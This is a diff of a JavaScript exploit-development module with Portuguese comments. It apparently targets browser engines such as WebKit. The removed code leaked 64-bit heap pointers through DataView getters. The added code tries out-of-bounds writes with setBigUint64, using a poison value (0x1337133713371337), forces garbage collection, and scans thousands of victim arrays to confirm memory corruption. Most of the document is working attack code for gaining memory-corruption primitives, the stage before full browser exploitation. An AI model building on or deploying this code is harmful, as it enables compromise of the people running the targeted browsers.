@@ -1,7 +1,8 @@
 
 /**
- * MÓDULO 3: EXECUTOR & ANALYZER (ATOMIC 64-BIT EDITION)
- * Objetivo: Capturar ponteiros reais de 64 bits ignorando a sanitização de memória.
+ * MÓDULO 3: EXECUTOR (CORRUPTION HUNTER - OOB WRITE)
+ * Objetivo: Executar a escrita desanexada e varrer as vítimas
+ * procurando a assinatura do nosso veneno.
  */
 
 import { GC } from './mod_gc.js';
@@ -9,6 +10,9 @@ import { GC } from './mod_gc.js';
 export const Executor = {
 
     blacklist: ['constructor', 'reload', 'location', 'open', 'alert', 'close'],
+    
+    // O VENENO: Este é o valor que tentaremos injetar na memória
+    poisonValue: 0x1337133713371337n,
 
     run: function*(targets, payloads) {
         let testCount = 0;
@@ -26,67 +30,67 @@ export const Executor = {
             for (let prop of props) {
                 if (this.blacklist.includes(prop) || prop.startsWith('on')) continue;
 
+                // Para o OOB Write, focamos APENAS nas funções de ESCRITA
+                if (!prop.startsWith('set')) continue;
+
                 yield { type: 'STATUS', target: `${target.category} > ${target.name}.${prop}` };
 
                 try {
-                    let descriptor = Object.getOwnPropertyDescriptor(obj, prop);
-                    if (descriptor && descriptor.get) continue; 
-
                     let member = obj[prop];
 
                     if (typeof member === 'function') {
                         for (let p of payloads) {
                             try {
-                                // Realizamos a chamada passando 'true' para Little-Endian se for DataView
-                                let result = member.call(obj, p.val, true);
+                                // ==========================================
+                                // O GATILHO DE ESCRITA
+                                // member.call(DataView, offset, valor, littleEndian)
+                                // ==========================================
+                                if (prop === 'setBigUint64') {
+                                    member.call(obj, p.val, this.poisonValue, true);
+                                } else {
+                                    // Pula outras funções de set para não sujar a tela
+                                    continue; 
+                                }
                                 
-                                // Gatilho de Pressão de Memória
                                 GC.force();
                                 yield { type: 'GC_TICK' }; 
 
-                                let anomaly = this.analyze(prop, result, `CALL [${p.label}]`);
-                                
-                                if (anomaly) {
-                                    // ==========================================
-                                    // EXTRAÇÃO ATÔMICA DE 64-BITS
-                                    // ==========================================
-                                    
-                                    // Caso 1: O vazamento veio via getFloat64 (Mais comum no WebKit)
-                                    if (prop === 'getFloat64' && typeof result === 'number' && !isNaN(result)) {
-                                        let buffer = new ArrayBuffer(8);
-                                        new Float64Array(buffer)[0] = result;
-                                        let view = new BigUint64Array(buffer);
-                                        let hexPointer = "0x" + view[0].toString(16).padStart(16, '0');
+                                // ==========================================
+                                // A VALIDAÇÃO (O SCAN DAS VÍTIMAS)
+                                // ==========================================
+                                let corruptionFound = false;
+                                let victimIndex = -1;
 
-                                        if (hexPointer.includes('7ff8') || hexPointer.startsWith('0x00003')) {
-                                            anomaly.reason += `<br><br><span style="color:#0f0; background:#002200; padding:5px; font-weight:bold; font-size:14px;">[$$$] FLOAT64 LEAK REAL: ${hexPointer}</span>`;
-                                        }
+                                // Varremos as 5000 vítimas rapidamente
+                                for (let i = 0; i < window.victims.length; i++) {
+                                    // Verifica os primeiros índices da vítima
+                                    if (window.victims[i][0] === this.poisonValue || window.victims[i][1] === this.poisonValue) {
+                                        corruptionFound = true;
+                                        victimIndex = i;
+                                        break;
                                     }
-                                    
-                                    // Caso 2: O vazamento veio via getBigUint64
-                                    else if (prop === 'getBigUint64' && typeof result === 'bigint') {
-                                        let hexPointer = "0x" + result.toString(16).padStart(16, '0');
-                                        
-                                        if (hexPointer.includes('7ff8') || hexPointer.startsWith('0x00003')) {
-                                            anomaly.reason += `<br><br><span style="color:#0f0; background:#002200; padding:5px; font-weight:bold; font-size:14px;">[$$$] BIGINT64 LEAK REAL: ${hexPointer}</span>`;
-                                        }
-                                    }
-                                    // ==========================================
-
-                                    yield { type: 'ANOMALY', api: `${target.name}.${prop}`, ...anomaly };
                                 }
-                            } catch (e) {}
+
+                                if (corruptionFound) {
+                                    yield { 
+                                        type: 'ANOMALY', 
+                                        api: `${target.name}.${prop}`, 
+                                        action: `WRITE [${p.label}]`,
+                                        val: "SUCESSO",
+                                        reason: `<br><br><span style="color:#fff; background:#ff0033; padding:8px; font-weight:bold; font-size:15px; display:block; text-align:center;">
+                                        [!!!] OOB WRITE CONFIRMADO [!!!]<br>
+                                        Vítima #${victimIndex} foi corrompida com o veneno 0x1337133713371337!
+                                        </span>`
+                                    };
+                                }
+
+                            } catch (e) {
+                                // A mitigação bloqueou a escrita. Vida que segue.
+                            }
                             
                             testCount++;
                             if (testCount % 5 === 0) yield { type: 'TICK', count: testCount };
                         }
-                    } else {
-                        let anomaly = this.analyze(prop, member, "GET");
-                        if (anomaly) {
-                            yield { type: 'ANOMALY', api: `${target.name}.${prop}`, ...anomaly };
-                        }
-                        testCount++;
-                        if (testCount % 5 === 0) yield { type: 'TICK', count: testCount };
                     }
                 } catch (e) {}
             }
@@ -94,24 +98,5 @@ export const Executor = {
         yield { type: 'FINISHED', count: testCount };
     },
 
-    analyze: function(prop, val, action) {
-        if (val === undefined || val === null) return null;
-
-        // Se o valor for um número muito alto ou o marcador de NaN-Boxing
-        if (typeof val === 'number') {
-            if (val === 0x7ff80000) {
-                return { action, val: `0x7ff80000`, reason: "Header detectado. Aguardando extração de 64 bits..." };
-            } 
-            else if (val > 0x10000000 && val !== 2147483647 && val !== Infinity) {
-                return { action, val: `0x${val.toString(16)}`, reason: "Vazamento de endereço de 32 bits." };
-            }
-        }
-        
-        // Se o valor for BigInt (Ponteiro de 64 bits puro)
-        if (typeof val === 'bigint') {
-            return { action, val: `0x${val.toString(16)}`, reason: "Captura direta de 64 bits via BigInt." };
-        }
-
-        return null;
-    }
+    analyze: function() { return null; } // Desativado, validação é feita inline agora
 };
